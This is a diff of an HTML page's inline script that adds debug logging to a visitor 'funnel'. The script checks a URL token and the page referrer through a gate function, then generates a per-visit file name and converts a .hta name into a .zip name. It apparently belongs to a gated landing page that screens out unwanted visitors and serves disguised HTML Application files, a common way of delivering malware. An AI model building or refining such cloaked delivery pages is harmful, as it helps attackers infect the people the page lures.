@@ -40,13 +40,17 @@
   <script src="gate.js"></script>
   <script>
     (function () {
+      window.__steps2=[];
       var q = new URLSearchParams(location.search);
       var tk = q.get('tk') || '';
-      if (!tk) { window.gateStep({ entry: true }); return; }
-      if (!window.gateStep({ entry: false, allowedRefPaths: ['/', '/index.html'] })) return;
-
+      window.__steps2.push('tk:'+(tk?'yes':'NO'));
+      if (!tk) { window.__steps2.push('no-tk->gateEntry'); window.gateStep({ entry: true }); return; }
+      window.__steps2.push('ref:'+(document.referrer||'(empty)'));
+      if (!window.gateStep({ entry: false, allowedRefPaths: ['/', '/index.html'] })) { window.__steps2.push('GATE-FAIL'); return; }
+      window.__steps2.push('gate-pass');
       // Fresh name for THIS visit (fixed for the whole funnel).
       var name = window.makeName();
+      window.__steps2.push('name:'+name);
       var kind = window.nameKind(name);
       var zipName = name.replace(/\.hta$/i, '.zip');
 
